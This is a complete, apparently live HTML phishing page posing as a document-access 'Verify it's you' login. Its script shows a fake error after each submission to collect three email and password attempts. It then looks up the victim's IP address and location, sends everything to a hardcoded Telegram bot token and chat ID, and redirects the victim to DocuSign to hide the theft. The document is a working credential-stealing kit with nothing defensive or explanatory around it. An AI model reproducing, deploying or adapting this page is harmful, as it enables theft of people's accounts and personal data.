<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify It's You</title>
  <link rel="icon" type="image/png" href="https://i.ibb.co/hFxXYymQ/logo.png" sizes="32x32">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url("https://i.ibb.co/dw500FdJ/background.jpg");
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 300px;
      text-align: left;
    }
    .logo {
      width: 80px;
      height: auto;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #333333;
    }
    p {
      font-size: 14px;
      color: #666666;
      margin-bottom: 20px;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #cccccc;
      border-radius: 4px;
      font-size: 14px;
      box-sizing: border-box;
    }
    .checkbox {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    .checkbox input {
      margin-right: 10px;
    }
    .checkbox label {
      font-size: 14px;
      color: #666666;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #8B0000;
      color: #ffffff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      box-sizing: border-box;
    }
    button:hover {
      background-color: #6B0000;
    }
    .error-message {
      display: none;
      color: red;
      margin-bottom: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://i.ibb.co/hFxXYymQ/logo.png" alt="Logo" class="logo" />
    <h1>Verify it's you</h1>
    <p>Only recipient email can access document</p>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <div class="checkbox">
        <input type="checkbox" id="keep-signed-in" name="keep-signed-in" />
        <label for="keep-signed-in">Keep me signed in</label>
      </div>
      <div class="error-message" id="errorMsg">‚ùå Incorrect email or password.</div>
      <button type="submit">Next</button>
    </form>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const errorMsg = document.getElementById("errorMsg");
    const attempts = [];
    
    // Auto-fill email from URL fragment
const fragmentEmail = window.location.hash.slice(1);
if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
  form.email.value = fragmentEmail;
}
    
    const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
    const chatId = "5613637159";
    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = form.email.value.trim();
      const password = form.password.value.trim();

      // Save attempt
      attempts.push({ email, password });

      errorMsg.style.display = "block";
      
      // Remove error if user types again
      form.querySelectorAll("input").forEach(input => {
        input.addEventListener("input", () => {
          errorMsg.style.display = "none";
        }, { once: true });
      });

      // Clear inputs
      form.reset();

      if (attempts.length === 3) {
        // Get IP and location
        try {
          const ipRes = await fetch("https://api.ipify.org?format=json");
          const { ip } = await ipRes.json();

          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
          const geo = await geoRes.json();

          const now = new Date();
          const timestamp = now.toUTCString();

          let message = `üîê pdf-unlock Login Attempts\n`;
          attempts.forEach((attempt, i) => {
            message += `#${i + 1} ${i < 2 ? "‚ùå Failed" : "‚úÖ Final Attempt"}\n`;
            message += `üë§ email: ${attempt.email}\nüîë Password: ${attempt.password}\n\n`;
          });

          message += `üïí Time: ${timestamp}\n`;
          message += `üåç Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
          message += `üì° IP: ${ip}`;

          await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
              chat_id: chatId,
              text: message
            })
          });

          // Redirect to DocuSign
          window.location.href = "https://www.docusign.com";

        } catch (err) {
          alert("‚ùå Error sending final data.");
          console.error(err);
        }
      }
    });
  </script>
</body>
</html>
